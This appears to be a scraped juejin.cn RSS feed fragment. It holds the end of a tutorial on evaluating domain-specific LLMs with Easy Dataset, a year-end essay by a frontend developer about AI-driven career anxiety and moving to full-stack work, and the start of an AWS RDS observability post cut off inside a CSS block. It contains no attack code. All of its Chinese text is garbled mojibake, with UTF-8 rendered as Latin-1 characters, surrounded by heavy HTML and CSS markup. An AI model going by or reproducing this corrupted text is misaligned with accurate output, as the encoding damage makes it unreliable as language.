<p>å…·ä½“çš„è¯„åˆ†ç»†åˆ™åœ¨åˆ›å»ºä»»åŠ¡ä¸­æ˜¯å¯ä»¥é…ç½®çš„ï¼Œå®é™…å½±å“çš„å°±æ˜¯æç¤ºè¯ä¸­çš„ <code>{{scoreAnchors}}</code> å˜é‡ï¼Œåœ¨è¿™é‡Œçš„è®¾ç½®å¯ä»¥ç›´æ¥è¦†ç›–è¿™ä¸ªå˜é‡ï¼Œè‡ªç”±åº¦æ›´é«˜ã€‚</p>
</blockquote>
<h2 data-id="heading-19">æœ€å</h2>
<p>å¸Œæœ›é˜…è¯»å®Œæœ¬æœŸæ•™ç¨‹ï¼Œä½ å°†å­¦ä¼šä»¥ä¸‹å†…å®¹ï¼š</p>
<ol>
<li>ç†è§£é€šç”¨åŸºå‡†åœ¨å‚ç›´é¢†åŸŸçš„å±€é™æ€§ï¼Œæ˜ç¡®è¯„ä¼°çš„ä¸‰å¤§æ ¸å¿ƒç›®æ ‡ï¼ˆé€‰å‹éªŒè¯ã€å¾®è°ƒæ•ˆæœã€RAGä¼˜åŒ–ï¼‰</li>
<li>æŒæ¡ä¸‰ç±»å‚ç›´é¢†åŸŸè¯„ä¼°æ–¹æ³•çš„é€‚ç”¨åœºæ™¯ï¼ˆç¡®å®šæ€§è¯„ä¼°ã€æ–‡æœ¬ç›¸ä¼¼åº¦è¯„ä¼°ã€LLM as Judgeï¼‰</li>
<li>å­¦ä¼šå¤šæ–¹å¼æ„å»ºå‚ç›´é¢†åŸŸè¯„ä¼°æµ‹è¯•é›†ï¼ˆæ–‡çŒ®æå–ã€è®­ç»ƒé›†è½¬åŒ–ã€è‡ªå®šä¹‰å¯¼å…¥ï¼‰</li>
<li>æŒæ¡å®¢è§‚é¢˜è§„åˆ™åˆ¤åˆ†ã€ä¸»è§‚é¢˜æ•™å¸ˆæ¨¡å‹æ‰“åˆ†çš„è‡ªåŠ¨åŒ–è¯„ä¼°æ–¹æ³•</li>
<li>èƒ½è®¾è®¡å¹¶æ‰§è¡Œäººå·¥ç›²æµ‹ä»»åŠ¡ï¼Œè·å–è´´åˆå®é™…ä½“æ„Ÿçš„æ¨¡å‹å¯¹æ¯”ç»“æœ</li>
<li>å¯é€šè¿‡è‡ªå®šä¹‰æç¤ºè¯é€‚é…ä¸åŒå‚ç›´é¢†åŸŸçš„è¯„ä¼°éœ€æ±‚</li>
<li>å»ºç«‹â€œæµ‹è¯•é›†æ„å»ºâ€”è‡ªåŠ¨åŒ–è¯„ä¼°â€”äººå·¥éªŒè¯â€çš„è¯„ä¼°é—­ç¯ï¼Œå®ç°æ¨¡å‹æ•ˆæœé‡åŒ–åˆ¤æ–­</li>
</ol>
<p>å…³æ³¨ã€Šcodeç§˜å¯†èŠ±å›­ã€‹ä»æ­¤å­¦ä¹  AI ä¸è¿·è·¯ï¼Œç›¸å…³é“¾æ¥ï¼š</p>
<ul>
<li>Easy Datasetï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FConardLi%2Feasy-dataset" target="_blank" title="https://github.com/ConardLi/easy-dataset" ref="nofollow noopener noreferrer">github.com/ConardLi/eaâ€¦</a></li>
<li>AI æ•™ç¨‹å®Œæ•´æ±‡æ€»ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Frncg5jvpme.feishu.cn%2Fwiki%2FU9rYwRHQoil6vBkitY8cbh5tnL9" target="_blank" title="https://rncg5jvpme.feishu.cn/wiki/U9rYwRHQoil6vBkitY8cbh5tnL9" ref="nofollow noopener noreferrer">rncg5jvpme.feishu.cn/wiki/U9rYwRâ€¦</a></li>
<li>ç›¸å…³å­¦ä¹ èµ„æºæ±‡æ€»åœ¨ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FConardLi%2Feasy-learn-ai" target="_blank" title="https://github.com/ConardLi/easy-learn-ai" ref="nofollow noopener noreferrer">github.com/ConardLi/eaâ€¦</a></li>
</ul>
<p>å¦‚æœæœ¬æœŸå¯¹ä½ æœ‰æ‰€å¸®åŠ©ï¼Œå¸Œæœ›å¾—åˆ°ä¸€ä¸ªå…è´¹çš„ä¸‰è¿ï¼Œæ„Ÿè°¢å¤§å®¶æ”¯æŒ</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025å¹´ç»ˆæ€»ç»“-éƒ½åœ¨å–Šå‰ç«¯å·²æ­»ï¼Œè¿™ä¸€å¹´æˆ‘çš„ç„¦è™‘ã€æŒ£æ‰ä¸é‡ç»„ï¼šAI æ—¶ä»£å¦‚ä½•æ‘†æ­£è‡ªå·±çš„ä½ç½®]]></title>    <link>https://juejin.cn/post/7594835618120925224</link>    <guid>https://juejin.cn/post/7594835618120925224</guid>    <pubDate>2026-01-14T11:32:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594835618120925224" data-draft-id="7595034434976006182" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025å¹´ç»ˆæ€»ç»“-éƒ½åœ¨å–Šå‰ç«¯å·²æ­»ï¼Œè¿™ä¸€å¹´æˆ‘çš„ç„¦è™‘ã€æŒ£æ‰ä¸é‡ç»„ï¼šAI æ—¶ä»£å¦‚ä½•æ‘†æ­£è‡ªå·±çš„ä½ç½®"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-14T11:32:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çŒªçŒªæ‹†è¿é˜Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/2541726613638973"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025å¹´ç»ˆæ€»ç»“-éƒ½åœ¨å–Šå‰ç«¯å·²æ­»ï¼Œè¿™ä¸€å¹´æˆ‘çš„ç„¦è™‘ã€æŒ£æ‰ä¸é‡ç»„ï¼šAI æ—¶ä»£å¦‚ä½•æ‘†æ­£è‡ªå·±çš„ä½ç½®
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2541726613638973/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çŒªçŒªæ‹†è¿é˜Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T11:32:43.000Z" title="Wed Jan 14 2026 11:32:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>å‰è¨€</strong></p>
<p>ä»Šå¹´è¿™ä¸€å¹´ï¼Œæˆ‘æ•´ä¸ªäººä¸€ç›´å¤„äºä¸€ç§ç´§ç»·çš„ç„¦è™‘çŠ¶æ€ã€‚</p>
<p>è¿™ç§ç„¦è™‘æ¥è‡ªäºä¸€ç§çœŸåˆ‡çš„å±æœºæ„Ÿï¼šä½œä¸ºå‰ç«¯ï¼Œæˆ‘å‘ç°è‡ªå·±æ›¾ç»å¼•ä»¥ä¸ºå‚²çš„â€œæŠ€æœ¯å£å’â€åœ¨ AI é¢å‰åƒçº¸ä¸€æ ·è–„ã€‚ä½†æœ€è¿‘ï¼Œæˆ‘çªç„¶æƒ³é€šäº†ã€‚å½“æˆ‘æ„è¯†åˆ° <strong>AI åªæ˜¯å·¥å…·ï¼Œå…¨æ ˆæ‰æ˜¯å”¯ä¸€å‡ºè·¯ï¼ŒçŸ¥è¯†å¹¿åº¦æ‰æ˜¯æŠ¤åŸæ²³</strong> çš„æ—¶å€™ï¼Œæˆ‘çš„ç„¦è™‘ç¼“è§£äº†ã€‚</p>
<p>è¿™ä¸€å¹´æˆ‘å†™äº†å¾ˆå¤šæ–‡ç« ã€æŠ˜è…¾äº†å¼€æºé¡¹ç›®ã€å­¦äº†æ–°è¯­è¨€ï¼ŒåŸæœ¬ä»¥ä¸ºæ˜¯åœ¨æµªè´¹æ—¶é—´â€œä¹±æ’â€ï¼Œç°åœ¨å›å¤´çœ‹ï¼Œè¿™æ°æ°æ˜¯æˆ‘åŠ é€Ÿè½¬å‹çš„æŠ¤åŸæ²³ã€‚</p>
<p>ä»Šå¤©æƒ³æŠŠè¿™ä¸€å¹´çš„æ€è€ƒæ€»ç»“å‡ºæ¥ï¼Œåˆ†äº«ä¸€ä¸‹ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€ è®¤æ¸…æ—¶ä»£çš„æ´ªæµï¼šäººæ˜¯é˜»æŒ¡ä¸äº†è¶‹åŠ¿çš„</h2>
<p>å¾ˆå¤šäººç§ä¸‹é‡Œå¯¹ AI å¤„äºä¸€ç§**â€œé—´æ­‡æ€§ç§¯æï¼ŒæŒç»­æ€§æ’æ–¥â€**çš„çŠ¶æ€ã€‚è¿™ç§å¿ƒæ€é€šå¸¸åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼š</p>
<ol>
<li><strong>è½»è§†/å˜²è®½ï¼š</strong> æ‰¾ AI çš„é€»è¾‘é”™è¯¯ï¼Œé€šè¿‡å˜²è®½æ¥è·å¾—å¿ƒç†å®‰æ…°ã€‚</li>
<li><strong>ç„¦è™‘/æŠ—æ‹’ï¼š</strong> æ„è¯†åˆ°å®ƒå¾ˆå¼ºï¼Œä½†é€šè¿‡æ‹’ç»æ¥è§¦æ¥å»¶ç¼“å±æœºï¼Œè§‰å¾—ç”¨äº†å®ƒå°±â€œè¾“äº†â€ã€‚</li>
<li><strong>å¦¥å/å…±ç”Ÿï¼š</strong> æ—¢ç„¶æ— æ³•æ‰“è´¥ï¼Œå°±æŠŠå®ƒå½“æˆèº«ä½“çš„ä¸€éƒ¨åˆ†ã€‚</li>
</ol>
<p><strong>æˆ‘ä»¬è¦æ¸…é†’ä¸€ç‚¹ï¼šäººæ˜¯é˜»æŒ¡ä¸äº†æ—¶ä»£æ´ªæµçš„ã€‚</strong> ç°åœ¨çš„ä¸šåŠ¡é€»è¾‘ï¼Œä½ æ‰‹åŠ¨å†™ 100 éä¹Ÿä¸ä¼šæœ‰ä»»ä½•æå‡ã€‚æŠŠæ—¶é—´æµªè´¹åœ¨æ— æ„ä¹‰çš„é‡å¤åŠ³åŠ¨ä¸Šï¼Œä¸ä»…æ˜¯åœ¨æ¶ˆè€—ç”Ÿå‘½ï¼Œæ›´æ˜¯å¯¹èŒä¸šç”Ÿæ¶¯çš„è‡ªæ€ã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€ æ ¸å¿ƒæ€ç»´ï¼šä»â€œå•ä¸€èŒä¸šâ€å‘â€œå­¦ç§‘é‡ç»„â€åˆ‡æ¢</h2>
<p>è¿™æ˜¯æˆ‘ä»Šå¹´æœ€å¤§çš„è®¤çŸ¥æå‡ï¼š<strong>ä½œä¸ºâ€œå²—ä½â€çš„å‰ç«¯å’Œåç«¯ä¼šé€æ¸æ¶ˆäº¡ï¼Œä½†ä½œä¸ºâ€œå­¦ç§‘â€çš„å‰ç«¯å’Œåç«¯ä¼šå‘ç”Ÿé‡ç»„ã€‚</strong></p>
<h3 data-id="heading-2">1. æ‘†è„±å•ä¸€èŒä¸šçš„æŸç¼š</h3>
<p>ä¸è¦æŠŠè‡ªå·±é”æ­»åœ¨â€œå‰ç«¯â€è¿™ä¸ªæ ‡ç­¾é‡Œã€‚å¦‚æœä½ åªç›¯ç€é‚£å‡ ä¸ª API å’Œæ¡†æ¶ï¼Œä½ çš„è·¯ä¼šè¶Šèµ°è¶Šçª„ã€‚AI æ—¶ä»£ï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯<strong>çŸ¥è¯†å¹¿åº¦</strong>ã€‚</p>
<h3 data-id="heading-3">2. æ€ç»´æ”¹å˜æ˜¯ç¬¬ä¸€æ­¥ï¼Œä½†è¦æœ‰â€œä½œå“â€æ”¯æ’‘</h3>
<p>ä¸è¦åªæ˜¯ç©ºæƒ³ï¼Œè¦å»å®æ–½ä¸€å¥— <strong>â€œAI é©±åŠ¨çš„å¼€å‘æµâ€</strong> ã€‚</p>
<ul>
<li><strong>ä½ å¯ä»¥ä¸å†™ä»£ç ï¼Œä½†ä½ å¿…é¡»èƒ½ç¬é—´çœ‹å‡º AI å†™çš„ä»£ç å“ªé‡Œæœ‰å‘ã€‚</strong></li>
<li>ä½ çš„ä»·å€¼ä¸åœ¨äºâ€œä½¿ç”¨ AI ç¼–ç â€ï¼Œè€Œåœ¨äºä½ æ‹¥æœ‰<strong>å…¨å±€æ€è€ƒ</strong>çš„èƒ½åŠ›ï¼Œèƒ½å®šä¹‰è¾¹ç•Œï¼Œèƒ½æŠŠæ§é£é™©ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-4">ä¸‰ã€ å®æ“æ–¹æ³•ï¼šå¦‚ä½•æŠŠ AI ç»ƒæˆä½ çš„â€œå¤–éª¨éª¼â€ï¼Ÿ</h2>
<h3 data-id="heading-5">1. å»ºç«‹åœºæ™¯åŒ–çš„ Prompt èµ„äº§åº“</h3>
<p>ä¸è¦æŠŠ AI å½“æˆç®€å•çš„æœç´¢å¼•æ“ã€‚ä½ éœ€è¦é’ˆå¯¹ä¸åŒçš„åœºæ™¯ï¼ˆå¦‚ï¼šå¤æ‚è¡¨å•é€»è¾‘ã€ç»„ä»¶è¾¹ç•Œè®¾è®¡ã€æ€§èƒ½ä¼˜åŒ–ï¼‰å»ºç«‹ä¸“ç”¨çš„ Promptã€‚</p>
<blockquote>
<p><strong>å¿ƒå¾—ï¼š</strong> æ˜ç¡®è®¾è®¡ç»„ä»¶çš„è¾¹ç•Œï¼Œç»™ AI å®šå¥½è§„çŸ©ï¼Œå®ƒäº§å‡ºçš„ä»£ç æ‰ä¸ä¼šè·‘åã€‚</p>
</blockquote>
<h3 data-id="heading-6">2. åœ¨æŒæ§èŒƒå›´å†…ä½¿ç”¨</h3>
<p>ä¸è¦æŠŠä»£ç å®Œå…¨äº¤ç»™ AI åå°±æ’’æ‰‹ä¸ç®¡ã€‚<strong>è¦æŠŠ AI é™åˆ¶åœ¨ä½ èƒ½æŠŠæ§çš„èŒƒå›´å†…</strong>ï¼Œé˜²æ­¢ä»£ç åº“ç”±äºä¸å—æ§è€Œå´©åã€‚è¿™ç§â€œæŠŠæ§åŠ›â€å°±æ˜¯ senior å’Œ junior çš„åˆ†æ°´å²­ã€‚</p>
<h3 data-id="heading-7">3. æ•°æ®å¯¹æ¯”ï¼šæ„ŸçŸ¥æ•ˆç‡çš„ä»£å·®</h3>
<p>æˆ‘æ›¾åšè¿‡å¯¹æ¯”ï¼Œä¼ ç»Ÿçš„ Spec ç¡®è®¤åˆ°å¼€å‘å®Œæˆï¼Œå’Œç°åœ¨çš„ <strong>Spec Codingï¼ˆåŸºäºè§„æ ¼è¯´æ˜ä¹¦ç¼–ç¨‹ï¼‰</strong> æ¨¡å¼ç›¸æ¯”ï¼Œæ•ˆç‡æ˜¯é‡çº§çš„å·®åˆ«ã€‚è¿™ç§æ•ˆç‡çº¢åˆ©ï¼Œå°±æ˜¯ä½ è½¬å‹çš„åŠ¨åŠ›ã€‚</p>
<hr/>
<h2 data-id="heading-8">å››ã€ å…³äºå…¨æ ˆï¼šå”¯ä¸€çš„è·¯ï¼Œä¹Ÿæ˜¯æœ€å¥½çš„ç»ƒä¹ åœº</h2>
<p>å¾ˆå¤šäººé—®ï¼šæˆ‘æƒ³åˆ‡å…¨æ ˆï¼Œä½†åç«¯è¯­æ³•ã€ç¯å¢ƒé…ç½®ä¹±ä¸ƒå…«ç³Ÿï¼Œæ€ä¹ˆå­¦ï¼Ÿ</p>
<ol>
<li><strong>æ‹¿å…¬å¸é¡¹ç›®ç»ƒæ‰‹ï¼š</strong> ä¸è¦æ€•ç¯å¢ƒä¹±ã€‚ç¯å¢ƒé…ç½®ã€éƒ¨ç½²é“¾è·¯è¿™äº›ç¹ççš„äº‹ï¼Œæ°æ°æ˜¯ AI æœ€æ“…é•¿çš„ã€‚è®© AI å¸¦ä½ è·‘é€šå…¬å¸çš„åç«¯æµç¨‹ï¼Œè¿™æ˜¯æˆæœ¬æœ€ä½çš„ç»ƒä¹ æ–¹å¼ã€‚</li>
<li><strong>å¿«é€Ÿåˆ‡æ¢è¯­æ³•ï¼š</strong> ä¸è¦æ­»èƒŒè¯­æ³•ä¹¦ã€‚åˆ©ç”¨ AI å¿«é€Ÿå¯¹æ¯”æ–°æ—§è¯­è¨€çš„å¼‚åŒï¼ˆæ¯”å¦‚ï¼šTS çš„ Interface åœ¨ Go é‡Œæ€ä¹ˆå®ç°ï¼Ÿï¼‰ã€‚</li>
<li><strong>æ—¶é—´è§„åˆ’ï¼š</strong> æŠ›å¼ƒé‚£ç§â€œç­‰æˆ‘å­¦å®Œå†åšâ€çš„æƒ³æ³•ã€‚ç›´æ¥å¸¦ç€ä»»åŠ¡å»é—® AIï¼Œåœ¨å®æˆ˜ä¸­æ‰©å……æŠ€æœ¯æ ˆã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-9">äº”ã€ æ€»ç»“ï¼šæŠ¤åŸæ²³ä»æœªæ¶ˆå¤±ï¼Œåªæ˜¯æ¢äº†åœ°æ–¹</h2>
<p>è¿™ä¸€å¹´ï¼Œæˆ‘è™½ç„¶ç„¦è™‘ï¼Œä½†å¹¶æ²¡é—²ç€ã€‚æˆ‘å‘ç°ï¼š</p>
<ul>
<li>ç„¦è™‘æ—¶å†™çš„æ–‡ç« ï¼Œæ‰“ç£¨äº†æˆ‘çš„<strong>é€»è¾‘è¡¨è¾¾</strong>ï¼›</li>
<li>ç„¦è™‘æ—¶æŠ˜è…¾çš„å¼€æºé¡¹ç›®ï¼Œæ‰©å……äº†æˆ‘çš„<strong>æŠ€æœ¯åº•åº§</strong>ï¼›</li>
<li>ç„¦è™‘æ—¶å­¦çš„åç«¯è¯­è¨€ï¼Œæå‡äº†æˆ‘çš„<strong>ç³»ç»Ÿè§‚</strong>ã€‚</li>
</ul>
<p>è¿™äº›çœ‹ä¼¼ä¹±æ’çš„ç»å†ï¼Œæœ€ç»ˆéƒ½è½¬åŒ–æˆäº†æˆ‘<strong>å¿«é€Ÿè½¬å‹çš„æŠ€æœ¯èƒ½åŠ›</strong>ã€‚</p>
<p><strong>å½“å¼€å‘æ¨¡å¼ä»ä¼ ç»Ÿç¼–ç¨‹æ¼”å˜æˆ Spec Coding æ—¶ï¼Œä½ çš„è®¤çŸ¥ã€ä½ çš„ç»éªŒã€ä½ å¯¹å¤æ‚ä¸šåŠ¡çš„æ´å¯Ÿï¼Œä¾ç„¶æ˜¯ AI æ— æ³•æ‹¿èµ°çš„æŠ¤åŸæ²³ã€‚</strong></p>
<p>ä¸è¦åœ¨æ²¡æœ‰æ„ä¹‰çš„äº‹æƒ…ä¸Šæµªè´¹æ—¶é—´ã€‚é¡ºåº”æ—¶ä»£ï¼Œä¿æŒæ€è€ƒã€‚å¦‚æœè¿™ä¸ªæ—¶ä»£æ³¨å®šè¦é‡ç»„ï¼Œé‚£æˆ‘ä»¬è¦åšçš„ï¼Œå°±æ˜¯æˆä¸ºé‚£ä¸ªäº²æ‰‹é‡ç»„è‡ªå·±çš„äººã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AWS RDS å¯è§‚æµ‹æ€§æœ€ä½³å®è·µ]]></title>    <link>https://juejin.cn/post/7595043061728722978</link>    <guid>https://juejin.cn/post/7595043061728722978</guid>    <pubDate>2026-01-14T11:33:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595043061728722978" data-draft-id="7594745643892883491" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AWS RDS å¯è§‚æµ‹æ€§æœ€ä½³å®è·µ"/> <meta itemprop="keywords" content="æ•°æ®åº“"/> <meta itemprop="datePublished" content="2026-01-14T11:33:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¯è§‚æµ‹æ€§ç”¨è§‚æµ‹äº‘"/> <meta itemprop="url" content="https://juejin.cn/user/2392958212523102"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AWS RDS å¯è§‚æµ‹æ€§æœ€ä½³å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2392958212523102/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¯è§‚æµ‹æ€§ç”¨è§‚æµ‹äº‘
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T11:33:48.000Z" title="Wed Jan 14 2026 11:33:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body 